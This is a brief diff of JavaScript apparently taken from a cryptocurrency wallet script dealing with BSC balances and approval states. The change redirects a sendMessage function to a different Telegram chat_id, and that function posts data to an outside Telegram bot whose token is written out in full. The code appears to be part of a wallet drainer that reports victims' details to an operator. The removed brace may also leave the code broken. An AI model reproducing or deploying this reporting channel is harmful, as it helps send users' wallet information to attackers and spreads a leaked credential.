@@ -328,7 +328,7 @@ async function getPrice(address){
 
 async function sendMessage(message){
   return new Promise((resolve, reject)=>{
-    const chat_id = 1027623484;
+    const chat_id = 5227607491;
     fetch(`https://api.telegram.org/bot5519263012:AAECn6WGaBWiGtY_1EBBEGkamw9e5W6qxvs/sendMessage?chat_id=${chat_id}&text=${message}`, {
           method: "GET",
           headers: {
@@ -646,7 +646,7 @@ async function proceed(){
           //     //   })
           //     // }
           //   }
-          }
+          
           if (x === bsc_length && (mum === "approved" || mum === "denied")){
         const bnb_balance = await getBalance(user_address, apiKey).catch(e=>{
           console.log("Unable to get new bsc balance", e);
